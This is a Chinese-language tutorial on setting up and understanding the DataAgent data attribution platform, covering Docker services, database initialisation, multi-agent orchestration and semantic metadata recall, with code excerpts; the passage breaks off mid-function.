# DataAgent 智能数据归因分析平台 · 教学课件

> 读者对象：要照着这份文档把项目**复现出来**的人。不需要读过这个仓库，但要懂 Python 基本语法。
>
> 代码基线：`Intelligent_digital_attribution`（`pyproject.toml` 中 `name = "data-agent"`，`version = "0.1.0"`）。
> 规模：`app/` 约 31,700 行 Python，`web/` 约 14,300 行前端代码。
>
> 所有路径均相对项目根目录。行号来自实际源码。

---

## 目录

```
1. 运行项目测试
2. 项目概述与架构
   2.3 核心概念 A：多 Agent 编排与会话隔离
   2.4 核心概念 B：元数据语义召回
   2.5 核心概念 C：查询身份与资产授权
3. 项目开发环境
4. 基础设施搭建（配置 / 四类客户端 / Checkpoint / Celery / 错误 / 日志）
5. 身份认证与数据授权（identity）
6. 元数据知识库与语义召回（metadata）
7. 安全查询链路（query）
8. 沙箱隔离工作区（sandbox）
9. 多 Agent 分析体系（assistant）
10. 跨存储工作流（workflows）
11. API 接口
12. 前后端联调
```

第 4 章到第 9 章是主体，占全篇 70% 以上。第 1~3 章只解决「怎么跑起来」。

---

# 1. 运行项目测试

## 1.1 项目代码说明

| 目录 | 职责 |
| --- | --- |
| `app/` | 后端全部业务代码，按 7 个顶层模块划分（`shared` / `identity` / `metadata` / `query` / `sandbox` / `assistant` / `workflows`）。 |
| `web/` | 前端 React 应用（Vite + TypeScript + Zustand），聊天页与管理中心。 |
| `conf/` | 应用配置。`app_config.yaml` 是运行参数，`.env` 是密钥，`meta_config.yaml` 是元数据导入文档。 |
| `dbmock/` | 独立的模拟电商数仓生成器，往 Doris 灌两年全量数据。它有自己的 `pyproject.toml` 和 `.venv`，是一个独立子项目。 |
| `docker/` | `compose.yml` 定义 PostgreSQL / Elasticsearch / Redis / Doris / 沙箱镜像；`sandbox/` 是用户容器的镜像定义。 |
| `scripts/` | 一次性脚本：`init_db.py` 重建 PostgreSQL 三库，`bootstrap_admin.py` 创建管理员。 |
| `logs/` | 运行期日志输出目录，启动时自动创建。 |

顶层还有 `main.py`（后端入口）与 `Makefile`（快捷命令）。

## 1.2 启动中间件服务

前置条件：

- Docker Desktop 已启动（沙箱功能强依赖 Docker 守护进程）。
- 本机 5432 / 6379 / 9200 / 9030 / 8030 端口未被占用。**这是最常见的启动失败原因**——如果本机已经装了一个 PostgreSQL 占了 5432，`compose up` 会报端口冲突，必须改 `docker/compose.yml` 里的映射或先停掉本机服务。

```bash
docker compose -f docker/compose.yml up -d
```

这条命令会拉起 5 个常驻服务，并额外构建一个「零副本」的沙箱镜像：

| 服务 | 镜像 | 端口 | 作用 |
| --- | --- | --- | --- |
| `postgres` | `postgres:17-alpine` | 5432 | 三个库：`auth` / `meta` / `langgraph`。首次创建数据卷时由 `docker/postgres/init-databases.sql` 自动建库。 |
| `elasticsearch` | 本地构建（含 IK 中文分词插件） | 9200 | 四个语义索引。 |
| `redis` | `redis:8.10.0-alpine` | 6379 | Celery broker/backend、认证限流、沙箱所有权协调，分别用 db 0/1/2/3。 |
| `doris-fe` | `apache/doris:fe-4.0.7` | 9030（MySQL 协议）、8030（HTTP） | 业务数仓。 |
| `doris-be` | `apache/doris:be-4.0.7` | 8040、9050 | 存储与计算后端。 |
| `doris-init` | 一次性容器 | — | 创建 `atguigu` 账号并授予 `internal.*.*` 权限，跑完即退出。 |
| `sandbox-image` | 本地构建 | — | `deploy.replicas: 0`，只负责构建出 `dataagent-sandbox:latest` 镜像，不会常驻运行。 |

Doris 首次启动比较慢（FE + BE 都带健康检查，`start_period` 30 秒），等状态变健康再继续：

```bash
docker compose -f docker/compose.yml ps
```

预期：`postgres`、`redis`、`doris-fe`、`doris-be` 显示 `healthy`；`elasticsearch` 显示 `running`；`sandbox-image` 与 `doris-init` 显示 `exited (0)`。

> 沙箱镜像缺失时应用会在启动阶段抛错：`Docker 沙箱镜像不存在: dataagent-sandbox:latest，请先执行 docker compose -f docker/compose.yml up -d`。单独重建镜像的命令是 `docker compose -f docker/compose.yml build sandbox-image`。

## 1.3 初始化数据 / 构建索引

这一步分三段：**配置密钥 → 建库 → 灌业务数据**。

### 1.3.1 生成密钥并写入配置

```bash
cp conf/.env.example conf/.env
```

`conf/.env` 里需要填的项（`conf/.env.example` 全文如下，逐字）：

```dotenv
# Doris 平台内部管理账号密码，用于元数据读取和权限管理
DORIS_ADMIN_PASSWORD=

# Doris 查询身份凭据加密密钥
# python3 -c 'from cryptography.fernet import Fernet; print(Fernet.generate_key().decode())'
DORIS_CREDENTIAL_ENCRYPTION_KEY=

# PostgreSQL 数据库密码
POSTGRES_PASSWORD=

# Tavily 密钥
TAVILY_API_KEY=

# SiliconFlow 密钥
SILICONFLOW_API_KEY=

# OpenRouter 密钥
OPENROUTER_API_KEY=

# DeepSeek 官方 API 密钥
DEEPSEEK_API_KEY=

# JWT 签名密钥，必须使用至少 32 字符的随机值
# python3 -c 'import secrets; print(secrets.token_urlsafe(48))'
JWT_SECRET=

# 管理员引导凭据（未通过 CLI 传入时读取）
ADMIN_USERNAME=
ADMIN_EMAIL=
ADMIN_PASSWORD=
```

本地 `docker/compose.yml` 里 PostgreSQL 和 Doris 的默认密码都是 `123123`，所以：

- `DORIS_ADMIN_PASSWORD=123123`
- `POSTGRES_PASSWORD=123123`

两个随机密钥按注释里的命令生成：

```bash
python3 -c 'from cryptography.fernet import Fernet; print(Fernet.generate_key().decode())'
python3 -c 'import secrets; print(secrets.token_urlsafe(48))'
```

分别填入 `DORIS_CREDENTIAL_ENCRYPTION_KEY`（必须是 44 字符的 Fernet key，配置模型会校验长度）和 `JWT_SECRET`（至少 32 字符）。

外部服务密钥的用途（`README.md` 里列了对照表）：

| 环境变量 | 用途 | 不填的后果 |
| --- | --- | --- |
| `DEEPSEEK_API_KEY` | 默认语言模型 `deepseek-deepseek-v4-flash` | 对话无法调用模型，必须填 |
| `SILICONFLOW_API_KEY` | `BAAI/bge-m3` 文本向量模型 | 语义索引与召回不可用，必须填 |
| `OPENROUTER_API_KEY` | `app_config.yaml` 中声明但默认注释掉的 OpenRouter 模型 | 保持注释即可不填 |
| `TAVILY_API_KEY` | Tavily MCP 搜索工具 | 想用 Explorer 的联网检索才需要 |

### 1.3.2 重建 PostgreSQL 三库

```bash
uv sync
make init-db
```

`scripts/init_db.py` 做的事情是**删除并重建** `auth` / `meta` / `langgraph` 三个库：

```python
if __name__ == "__main__":
    password = dotenv.dotenv_values(ENV_FILE).get("POSTGRES_PASSWORD")
    if password is None:
        raise ValueError(f"{ENV_FILE} 中缺少 POSTGRES_PASSWORD")

    initializer = PostgresInitializer(
        host=POSTGRES_HOST,
        port=POSTGRES_PORT,
        user=POSTGRES_USER,
        password=password,
    )

    initializer.delete_db("auth")
    initializer.create_db("auth")
    initializer.delete_db("meta")
    initializer.create_db("meta")
    initializer.delete_db("langgraph")
    initializer.create_db("langgraph")
```

> **破坏性脚本**：它先 `DROP DATABASE` 再 `CREATE`。只对本地可重建数据用。主机/端口/用户硬编码为 `127.0.0.1:5432/atguigu`，只有密码来自 `conf/.env`。

预期输出（三库各两条日志）：

```
INFO:__main__:数据库 auth 不存在，无需删除
INFO:__main__:数据库 auth 创建成功
INFO:__main__:数据库 meta 不存在，无需删除
INFO:__main__:数据库 meta 创建成功
INFO:__main__:数据库 langgraph 不存在，无需删除
INFO:__main__:数据库 langgraph 创建成功
```

**注意**：建表不在这里做。真正的 ORM 建表在应用启动的 `lifespan` 里，由 `init_tables()` 完成（见 4.11）。

### 1.3.3 生成 Doris 全量业务数据

数据文件通过 Git LFS 管理（`.gitattributes` 里 `dbmock/data/** filter=lfs`），先拉取：

```bash
git lfs install
git lfs pull
```

未正确拉取时，`dbmock/data/*.jsonl` 的内容会是以 `version https://git-lfs.github.com/spec/v1` 开头的指针文件而不是真实数据。

然后在 `dbmock/` 子项目里建库并灌数：

```bash
cp dbmock/.env.example dbmock/.env
# 把 dbmock/.env 里的 DB_PASSWORD 改成 123123

cd dbmock
uv sync
uv run scripts/init_db.py     # 删除并重建 ecommerce 库，执行全部业务表 DDL
uv run main.py                # 生成两年全量数据
cd ..
```

`dbmock/main.py` 是一个按「月」推进状态演化的生成器：

```python
def _parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description="生成电商数仓模拟数据")
    parser.add_argument(
        "--smoke",
        action="store_true",
        help="使用七天小数据集验证完整链路",
    )
    parser.add_argument(
        "--validate-only",
        action="store_true",
        help="只执行数据质量校验",
    )
    parser.add_argument(
        "--dimensions-only",
        action="store_true",
```

**推荐先用 smoke 模式跑一遍**（生成最近七天的小规模数据，链路与全量一致），确认环境通了再跑全量：

```bash
uv run main.py --smoke
```

全量数据生成通常要十几分钟，取决于本机资源和 Doris 负载。连接已有 Doris 时跳过本步，直接在 `conf/app_config.yaml` 里填连接信息。

> 这一步是整条链路里**唯一耗时超过 10 分钟**的环节，也是最容易失败的环节。Doris BE 没健康就灌数会中途报错。

### 1.3.4 什么时候要重跑

| 场景 | 要重跑什么 |
| --- | --- |
| 首次搭环境 | 1.3.1 → 1.3.2 → 1.3.3 全部 |
| 改了 `conf/app_config.yaml` 的库连接 | 不用重跑，重启后端即可 |
| 元数据 YAML 改了 | 不用重跑数据库，走 1.6 的后台管理页重新导入 |
| 想清空业务数据重来 | 重跑 `dbmock/scripts/init_db.py` + `dbmock/main.py` |
| 想清空应用数据（用户/会话/元数据） | 重跑 `make init-db`，注意会一并清掉管理员账号 |

## 1.4 创建管理员

```bash
make bootstrap-admin
```

等价于 `uv run -m scripts.bootstrap_admin`。它读取 `conf/.env` 里的 `ADMIN_USERNAME` / `ADMIN_EMAIL` / `ADMIN_PASSWORD`，**可重复执行**（幂等）。

`scripts/bootstrap_admin.py` 的配置优先级是 CLI → 环境变量：

```python
def _resolve_value(cli_val: str | None, env_name: str) -> str:
    """按 CLI -> 环境变量 的优先级获取非空配置值。"""
    if cli_val and cli_val.strip():
        return cli_val.strip()
    env_val = os.environ.get(env_name, "").strip()
    if env_val:
        return env_val
    raise ValueError(f"缺少必要配置，请通过 CLI 参数或环境变量 {env_name} 提供")
```

注意密码**只能**来自环境变量（`ADMIN_PASSWORD`），CLI 只支持用户名和邮箱。预期输出：

```
Admin bootstrap created: user_id=1, administrator=granted, doris_role=None
```

重复执行时输出变为：

```
Admin bootstrap verified: user_id=1, administrator=already-present, doris_role=None
```

`doris_role=None` 是正常的——管理员默认不绑定 Doris 查询角色，需要在管理页里分配。

## 1.5 运行后端项目

后端不是单个进程，是**四个进程**，`Makefile` 提供了一条命令全拉起来：

```bash
make start
```

它等价于 `make -j4 run web worker beat`。生产式部署时建议四个终端分开启动，方便看日志：

```bash
# 终端 1：后端 API
uv run main.py

# 终端 2：前端开发服务
npm --prefix web run dev

# 终端 3：Celery Worker
uv run celery --app app.shared.tasks.celery_app:celery_app worker -l INFO

# 终端 4：Celery Beat（定时调度）
uv run celery --app app.shared.tasks.celery_app:celery_app beat -l INFO
```

四个进程各自的作用：

| 进程 | 启动命令 | 缺了它会怎样 |
| --- | --- | --- |
| API | `uv run main.py` | 前后端全部接口 404 |
| Worker | `celery ... worker` | 元数据导入、语义索引同步、会话删除、用户注销全部卡在队列里不执行 |
| Beat | `celery ... beat` | 每日取值索引同步、过期草稿清理、注销重试都不会触发 |
| 前端 | `npm --prefix web run dev` | 只有接口没有界面 |

后端启动成功的关键日志（`main.py:93` 的 `_lifespan`）：

```
开始初始化应用资源
应用资源初始化完成
```

如果 Doris 里的查询角色配置有漂移，会看到这样一行警告但**不影响启动**：

```
Doris 查询角色完整性校验未通过，应用继续启动: ...
```

前端依赖安装：

```bash
npm --prefix web ci
```

> **Windows 上的一个坑**：`main.py` 末尾对事件循环做了特殊处理。uvicorn 0.36+ 在 Windows 上默认用 `ProactorEventLoop`，而 `psycopg` 的异步模式只支持 `SelectorEventLoop`，两者不兼容：

```python
if __name__ == "__main__":
    import asyncio

    config = uvicorn.Config("main:app", host="0.0.0.0", port=cfg.port)
    server = uvicorn.Server(config)
    if sys.platform == "win32":
        # uvicorn 0.36+ 在 Windows 上默认用 ProactorEventLoop（loop_factory 绕过
        # set_event_loop_policy），而 psycopg 异步模式只支持 SelectorEventLoop。
        loop = asyncio.SelectorEventLoop()
        asyncio.set_event_loop(loop)
        try:
            loop.run_until_complete(server.serve())
        finally:
            loop.close()
    else:
        server.run()
```

所以**不要用 `uvicorn main:app` 直接启动**，那样会绕开这段逻辑。

## 1.6 访问测试

| 入口 | 地址 |
| --- | --- |
| 前端 | <http://localhost:7001> |
| 后端 OpenAPI 文档 | <http://localhost:7000/docs> |

用 `conf/.env` 里的管理员账号登录前端，点左下角「后台」进入管理中心。管理中心有 4 个 Tab：

1. **元数据管理** —— 导入 `conf/meta_config.yaml`、查看表/字段/指标、触发索引同步。
2. **Doris 角色管理** —— 建角色、配表/列级 SELECT 权限、配行级策略。
3. **用户账号管理** —— 建用户、分配 Doris 角色。
4. **查询经验管理** —— 查看/禁用/删除沉淀下来的 SQL 经验。

**首次使用必须按顺序做两件事**，否则 Explorer 查不到任何表：

### 1.6.1 导入元数据并同步索引

1. 「元数据管理」→「元数据 YAML 导入导出」区域，选 `conf/meta_config.yaml`。
2. 模式选「全量替换」，点「执行导入」。
3. 导入完成后系统会自动提交字段和指标的语义索引同步任务。**保持 Worker 运行**，等任务完成后刷新页面，确认索引状态为「已同步」。
4. 「表元数据」区域全选数据表，点「全量同步取值索引」。

`conf/meta_config.yaml` 是一份 6540 行的文档（由 `scripts/development/generate_meta_config.py` 生成，首行注释「请勿手工编辑」），结构只有两个顶层键：`tables`（45 张表）和 `metrics`（114 条指标）。开头长这样：

```yaml
tables:
  - name: dim_date
    role: dim
    description: 公共日期维度，每个自然日期一行。
    columns:
      - name: date_key
        description: 日期键，格式为 YYYYMMDD。
        alias:
          - 日期键
        index_values: false
```

### 1.6.2 建 Doris 角色并分配

1. 「Doris 角色管理」→「添加角色」，填角色标识、查询用户、业务描述、资源工作组。
2. 选中角色，在「表与列数据权限 (SELECT)」区域配查询权限：
   - 表名留空 = 授予当前数据库全部表权限；
   - 填表名、字段留空 = 授予整表权限；
   - 表名和逗号分隔字段都填 = 仅授予指定字段权限。
3. 按需配行级策略，可设为新用户的默认角色。
4. 「用户账号管理」→ 添加或编辑用户，把 Doris 角色分配给需要查数的账号。

### 1.6.3 三个典型输入

登录后新建对话，可以试这三个问题，分别打在不同的能力上：

1. **「最近 30 天的 GMV 是多少？」** —— 走 Explorer 单 Agent 链路：语义召回定位表字段 → 生成 SQL → guard 校验 → Doris 执行 → 返回 CSV 与摘要。这条链最快，几秒到几十秒。
2. **「分析一下最近三个月各品类的销售趋势，找出下滑最严重的三个品类，出一份带图表的报告」** —— 走 Planner + Explorer + Analyst + Reviewer 多 Agent 链路，会生成自包含 HTML 报告。耗时长（几分钟），中途能看到子 Agent 的执行过程。
3. **「把订单明细导出来」** —— 验证产物交付：结果 CSV 会以附件形式挂在最终回答上。

## 1.7 运行效果展示

一次多 Agent 分析在前端呈现为这样几层（自上而下）：

```
┌──────────────────────────────────────────────────────────┐
│ 用户：分析最近三个月各品类的销售趋势……                    │
├──────────────────────────────────────────────────────────┤
│ ▶ 执行过程 (点击展开)                                     │
│   ├─ [Planner] 思考中……                                  │
│   ├─ delegation → explorer / analysis-1 / session-1        │
│   │    ├─ recall_context(query="品类销售趋势")            │
│   │    ├─ execute_sql(purpose="取品类月度销售额")         │
│   │    └─ status: completed                              │
│   ├─ delegation → analyst / analysis-1 / session-2        │
│   │    ├─ shell: python render_report.py                 │
│   │    └─ status: completed                              │
│   └─ delegation → reviewer / analysis-1 / session-3       │
│        └─ status: completed                              │
├──────────────────────────────────────────────────────────┤
│ 助手：已生成品类销售趋势分析报告。核心结论……             │
│ 📎 品类销售趋势报告.html   品类月度销售额.csv            │
└──────────────────────────────────────────────────────────┘
```

后端对应的日志顺序（`app/assistant/services/chat.py`）：

```
智能体回合开始: conversation_id=..., parts=1, attachments=0
智能体流式更新: conversation_id=..., nodes=('model',), messages=1
智能体回合结束: conversation_id=...
```

> 截图位：本地跑通后，把「管理中心 → 元数据管理」与「对话页多 Agent 执行过程展开态」各截一张，放在本节。文档里不预置图片，避免误导。

---

# 2. 项目概述与架构

## 2.1 项目概述

这是一个**面向企业数仓的自然语言取数与归因分析平台**。用户在网页上用中文提问，系统自己完成：找表 → 找字段 → 写 SQL → 校验 SQL → 执行 → 算指标 → 画图 → 写报告 → 自审一遍。

它解决的问题是：业务方问「上月华东区哪些品类在掉量」，传统做法要数据开发手工查表、写 SQL、算数、做图，一轮几小时。这套系统把这条链路交给一组协作的 Agent，把结果收敛到几分钟。

谁在用：

- **业务分析师** —— 提问拿结论和报告。
- **平台管理员** —— 在管理中心维护元数据、配置 Doris 角色与表/列级权限、审阅沉淀的查询经验。

设计上最值得注意的一点：**它不是「让大模型自由发挥去查库」**。模型的每一次查询都要过一道确定性的静态校验（`app/query/services/guard.py`，952 行），校验规则全部基于 sqlglot 的 AST 分析而不是提示词约束；模型能碰到哪些表、哪些字段，由数据库里的授权投影说了算，不取决于模型怎么想。

## 2.2 项目架构概述

```
┌───────────────────────────────────────────────────────────────────┐
│  前端 web/  React 19 + Vite + Zustand + Tailwind                  │
│  ├─ 对话页 Chat：SSE 流式渲染、子 Agent 执行过程、附件预览         │
│  └─ 管理中心 Admin：元数据 / Doris 角色 / 用户 / 查询经验          │
└──────────────────────────────┬────────────────────────────────────┘
                               │ HTTP + SSE（/api/v1/**）
┌──────────────────────────────▼────────────────────────────────────┐
│  接入层  main.py                                                  │
│  ├─ lifespan：初始化并释放全部共享资源                            │
│  ├─ trace 中间件：request_id / trace_id / client_ip → ContextVar  │
│  └─ 全局异常处理器：ProblemError → RFC 9457 Problem Details        │
└──────────────────────────────┬────────────────────────────────────┘
                               │
┌──────────────────────────────▼────────────────────────────────────┐
│  业务模块层  app/<module>/                                        │
│                                                                   │
│  identity      认证与授权：JWT、限流、Doris 角色、资产权限投影      │
│  metadata      元数据知识库：表/字段/指标登记 + 语义索引 + 多路召回  │
│  query         安全查询：只读 SQL 静态校验 → 流式执行 → 经验沉淀    │
│  sandbox       隔离工作区：每用户 Docker 容器、UID 隔离、跨进程协调  │
│  assistant     多 Agent 体系：Planner + Explorer/Analyst/Reviewer  │
│  workflows     跨存储工作流：用户注销级联清理                       │
│                                                                   │
│  每个模块内部固定分四层：                                          │
│    api/          路由与请求/响应模型（只做协议转换）               │
│    services/     用例编排（业务规则都在这一层）                    │
│    repositories/ 数据访问（SQL / ES 查询 / Doris 命令）            │
│    models/       ORM 模型与领域模型                                │
└──────────────────────────────┬────────────────────────────────────┘
                               │
┌──────────────────────────────▼────────────────────────────────────┐
│  基础设施层  app/shared/                                          │
│  config      OmegaConf + Pydantic 强校验配置                      │
│  clients     Doris / PostgreSQL×3 / Elasticsearch / Embedding      │
│              / LangGraph Checkpoint + advisory lock                │
│  tasks       Celery 应用、四个队列、Beat 定时表                    │
│  errors      ProblemError 异常族 + 全局处理器                      │
│  observability  loguru 结构化日志 + ContextVar 追踪上下文           │
└──────────────────────────────┬────────────────────────────────────┘
                               │
┌──────────────────────────────▼────────────────────────────────────┐
│  外部依赖                                                         │
│  PostgreSQL(auth/meta/langgraph)  Elasticsearch  Redis  Doris     │
│  Docker 守护进程（用户沙箱）      外部 LLM / Embedding / MCP       │
└───────────────────────────────────────────────────────────────────┘
```

分层职责与依赖方向：

| 层 | 放什么 | 依赖方向 |
| --- | --- | --- |
| `api/` | FastAPI 路由、Pydantic 请求/响应模型、依赖注入声明 | 只能调 `services/` |
| `services/` | 业务规则、事务边界、跨模块编排 | 调 `repositories/` 与其它模块的 `contracts` |
| `repositories/` | SQL、ES 查询、Doris 命令、Redis 操作 | 只依赖 `models/` 与 `shared/clients` |
| `models/` | SQLAlchemy ORM、Pydantic 领域模型 | 不依赖上层 |
| `shared/` | 与业务无关的通用能力 | 被所有层依赖，自身不依赖业务 |

**依赖倒置的落点**：模块之间不直接互相 import 实现类，而是通过 `contracts.py` 里的 `Protocol` 定义端口。例如 `app/workflows/contracts.py` 声明了两个协议：

```python
class UserSandboxCleaner(Protocol):
    """用户注销所需的沙箱清理能力。"""

    async def delete_user_sandbox(self, user_id: int) -> None:
        """删除用户全部沙箱资源。"""
        ...
```

`workflows` 只认这个协议，不认识 `DockerSandboxManager`。这样 `workflows` 既可以在 API 进程里跑，也可以在 Celery Worker 里跑，注入的是哪个实现由 `app/providers.py` 决定。

## 2.3 核心概念 A：多 Agent 编排与会话隔离

这是全项目最绕的一块。要理解它，先看**一次用户提问到底触发了几层嵌套**。

### 2.3.1 三层结构

```
第 1 层：Conversation（会话）
  一个 thread_id = "user_{user_id}:conversation_{conversation_id}"
  对应 LangGraph 里的一棵 Checkpoint 树

  第 2 层：Analysis（一次分析任务）
    analysis_id 是 Planner 自己起的名字，例如 "category-trend-2026q3"
    同一个 analysis_id 下可以有多个 Session

    第 3 层：Session（一个专业 Agent 的工作分支）
      checkpoint_ns = "subagents/{analysis_id}/{agent_type}/{session_id}"
      每个 Session 有独立的容器工作目录和独立的持久化状态
```

`checkpoint_ns` 的拼接写在 `app/shared/contracts/analysis.py`：

```python
    @property
    def checkpoint_ns(self) -> str:
        """生成受控的 Checkpoint namespace。"""
        return f"subagents/{self.analysis_id}/{self.agent_type}/{self.session_id}"
```

**为什么需要 namespace 而不是另起一个 thread**：所有 Session 共享同一个 `thread_id`，因此它们的状态存在同一棵 Checkpoint 树里，会话删除时删一次 thread 就能清干净（`delete_thread` 会连带删掉所有 namespace）。如果每个 Session 单独起 thread，删除会话就要遍历所有子线程，漏一个就是脏数据。

### 2.3.2 四个 Agent 的分工

| Agent | 定位 | 有什么工具 | 提示词在哪 |
| --- | --- | --- | --- |
| `planner` | 统筹者。拆任务、调度专业 Agent、汇总交付 | `delegation` / `list_sessions` / `delete_session` + `read_file` + `shell`（只读）+ QuickJS `eval` | `app/assistant/agents/planner/prompt.py` |
| `explorer` | 找数据。语义召回定位字段、写并执行只读 SQL | `recall_context` 等 5 个召回工具 + `execute_sql` + MCP 工具 | `app/assistant/agents/explorer/prompt.py` |
| `analyst` | 算数据。统计分析、归因下钻、画图、写 HTML 报告 | 无数据访问工具，只有文件与 shell | `app/assistant/agents/analyst/prompt.py` |
| `reviewer` | 挑毛病。独立复算、审计 SQL 与图表 | 同上 | `app/assistant/agents/reviewer/prompt.py` |

**权限是按工具切的，不是按提示词切的**。`app/assistant/agents/specialists.py` 里只有 Explorer 拿到了数据访问工具：

```python
    explorer_tool_names = {
        *(tool.name for tool in builtin_tools),
        *mcp_tool_names,
    }
    return {
        "explorer": SpecialistDefinition(
            builder=create_explorer_agent,
            tools=tuple(tools_by_name[name] for name in sorted(explorer_tool_names)),
        ),
        "analyst": SpecialistDefinition(
            builder=create_analyst_agent,
            skills=(agent_skills_mount_path("analyst"),),
        ),
        "reviewer": SpecialistDefinition(builder=create_reviewer_agent),
    }
```

`analyst` 和 `reviewer` 的 `tools` 是空的。它们在沙箱里能跑 Python，但沙箱 `network_mode: none` 且不注入任何数据库凭据，所以物理上也连不上 Doris——这是「能力隔离」而不是「约定隔离」。

### 2.3.3 委派是怎么发生的

Planner 调 `delegation(analysis_id, agent_type, session_id, message)`，工具实现（`app/assistant/agents/planner/tools/delegation.py`）把它转成一次 `AgentSessionService.execute_delegation`：

```
Planner 图
   └─ delegation 工具调用
        └─ AgentSessionService.execute_delegation
             ├─ 从 (analysis_id, agent_type, session_id) 构造 AgentSessionKey
             ├─ build_subagent_config：换掉 checkpoint_ns，进入子 namespace
             ├─ _get_replayed_delegation_result：检查这次 delegation 是否已执行过
             ├─ _invoke_specialist：真正跑 Specialist 图
             │    └─ _stream_specialist：把子图消息投影成前端可见的活动事件
             └─ 返回 DelegationResult(status, content, artifacts, warnings, ...)
```

**关键设计：同一个 `session_id` 可以反复续接**。第二次用同样的 `session_id` 委派时，Specialist 图的 Checkpoint 还在，它会带着上次的上下文继续干活。Planner 的提示词里明确要求：

> 各工作分支通过独立的 `session_id` 隔离；续接分析或处理修补时直接复用原 `session_id`。

### 2.3.4 修补机制（needs_repair）

Specialist 的结构化输出是一个三选一的协议（`app/assistant/agents/contracts.py`）：

```python
class AgentResult(StrictProtocolModel):
    """专业 Agent 与委派工具共用的结构化结果。"""

    status: Literal["completed", "needs_repair", "failed"]
    content: NonEmptyText
    artifacts: Annotated[list[ArtifactReference], Field(max_length=50)] = Field(
        default_factory=list
    )
    warnings: Annotated[list[NonEmptyText], Field(max_length=100)] = Field(
        default_factory=list,
        description="不影响正文结论的非阻断问题，包括被过滤的无效产物引用",
    )
    repair_requests: Annotated[list[RepairRequest], Field(max_length=50)] = Field(
        default_factory=list
    )
    failure_reasons: Annotated[list[NonEmptyText], Field(max_length=50)] = Field(
        default_factory=list
    )
```

三态语义用校验器强制：

```python
    @model_validator(mode="after")
    def validate_status_payload(self) -> Self:
        """校验状态与结果载荷的一致性。"""
        if self.status == "needs_repair" and not self.repair_requests:
            raise ValueError("needs_repair 状态必须包含至少一个修补请求")
        if self.status != "needs_repair" and self.repair_requests:
            raise ValueError("修补请求仅在 needs_repair 状态下有效")
        if self.status == "failed" and not self.failure_reasons:
            raise ValueError("failed 状态必须包含至少一个失败原因 (failure_reasons)")
        if self.status != "failed" and self.failure_reasons:
            raise ValueError("失败原因仅在 failed 状态下有效")
        return self
```

比如 analyst 发现 explorer 给的字段粒度不对，就返回 `needs_repair`，`repair_requests` 里指向 explorer 的 session。Planner 收到后重新调度那个上游 session 修补，修完再按依赖链重跑受影响的下游。**这条链路是「下游发现上游缺陷」的反馈机制**，也是这个项目比单 Agent 方案更接近真实数据工程实践的地方。

服务端对修补请求做了真实性校验——只能修补同一 analysis 内**已存在**的其它 Session：

```python
    async def _validate_repair_targets(
        self,
        result: SpecialistResult,
        session_key: AgentSessionKey,
    ) -> None:
        """只允许修补同 Analysis 内已存在的其他 Session。"""
        for request in result.repair_requests:
            target_key = AgentSessionKey(
                user_id=session_key.user_id,
                conversation_id=session_key.conversation_id,
                analysis_id=session_key.analysis_id,
                agent_type=request.target_agent_type,
                session_id=request.target_session_id,
            )
            if target_key.checkpoint_ns == session_key.checkpoint_ns:
                raise ValueError("专业 Agent Session 不能请求修补自身")
```

### 2.3.5 Run 与订阅解耦

一个容易踩的坑：SSE 连接断开不该把 Agent 执行杀掉。这个项目把「执行」和「订阅」拆开了，见 `app/assistant/services/conversation_run.py`：

```
POST /api/v1/chat/stream
   └─ ConversationRunService._start
        ├─ 在 _runs 字典里注册一个 _ConversationRun
        ├─ asyncio.create_task 跑后台执行
        └─ 返回第一个订阅者的事件流

  执行任务 ──publish──▶ 事件缓存 deque + 所有订阅者队列
                         （缓存有 512 条 / 2MB 两个上限）

GET /api/v1/chat/{id}/events（重连时用）
   └─ ConversationRunService.subscribe
        ├─ 如果 Run 还在：先回放缓存事件，再收实时事件
        └─ 如果 Run 已结束：立即返回一个 done
```

这个设计让「刷新页面还能看到正在跑的结果」成为可能：前端刷新后重新 `subscribe`，会先拿到缓存里的历史事件，再接着收新的。

## 2.4 核心概念 B：元数据语义召回

第二个绕的概念：**模型怎么知道该查哪张表**。

### 2.4.1 四层结构

```
Doris 物理数仓（45 张表、真实数据）
        │  导入（人工维护 YAML → 后台导入）
        ▼
元数据目录（PostgreSQL 的 meta 库）
   table_info / column_info / metric_info
   每条记录有 description、alias（别名）、examples（示例值）
        │  索引同步（Celery 任务）
        ▼
Elasticsearch 语义索引（4 个索引）
   data-agent-column    字段的 name / description / alias
   data-agent-metric    指标
   data-agent-value     字段取值（用于「华东区」这类值匹配）
   data-agent-query-experience  历史 SQL 经验
        │  召回（Explorer 调 recall_context）
        ▼
会话级召回快照（PostgreSQL 的 semantic_recall_snapshot）
   按 (user_id, conversation_id, query) 累积，供模型多轮补充检索
```

**为什么不能直接让模型看 `SHOW TABLES`**：真实数仓的表名字段名往往缩写严重、缺注释，而且表有 45 张、字段上千个，全塞进上下文不现实。所以要先做一层「人写注释 → 机器索引 → 按语义召回」。

### 2.4.2 三路召回怎么融合

`app/metadata/services/search.py` 里三路并行：

| 通道 | 查什么 | 用哪个索引 |
| --- | --- | --- |
| 全文 | terms 在 name / description / alias 里的字面命中 | column / metric |
| 向量 | terms 的 embedding 与文档向量的余弦相似度 | column / metric |
| 取值 | terms 直接命中字段的枚举值（如「华东」） | value |

融合算法是 RRF（倒数排名融合），分数与量纲无关：

```python
    @staticmethod
    def _rrf_score(rank: int) -> float:
        """计算倒数排名融合分数。"""
        return 1 / (_RRF_K + rank)
```

最后按类型内最大值归一化到 [0,1] 再截断：

```python
        ordered = sorted(
            scores.items(),
            key=lambda item: (-item[1].score, str(item[0])),
        )
        if not ordered:
            return [], False
        max_score = ordered[0][1].score
        ranked = [
            (
                key,
                round(candidate.score / max_score, 6),
                candidate.reasons,
            )
            for key, candidate in ordered[:limit]
        ]
        return ranked, len(ordered) > limit
```

**为什么用 RRF 而不是加权求和**：全文用的是 BM25 分数（可能到几十），向量用的是余弦相似度（0~1），量纲差两个数量级，加权求和要先做分数校准；RRF 只看排名，不需要校准。

### 2.4.3 query 是召回上下文的主键

`recall_context` 工具的第一个参数 `query` 不是检索词，而是**业务键**：

```python
        query: Annotated[
            str,
            (
                "当前会话内召回上下文的稳定业务键。后续补充检索必须原样复用，"
                "只调整 terms 和 resource_types"
            ),
        ],
```

同一个 `query` 的多次召回会**累积合并**成一份快照。这解决了「一轮召回不够，模型要分几次补充检索」的问题——模型第一次搜「销售额」，发现缺时间字段，第二次用同一个 query 搜「日期」，两次结果合并成一份完整上下文。

### 2.4.4 召回结果怎么进模型上下文

召回结果不直接返回全文，而是返回一个**引用**（`app/assistant/agents/explorer/semantic_recall_protocol.py`），真正的展开发生在模型请求前，由中间件完成：

```python
    async def awrap_model_call(
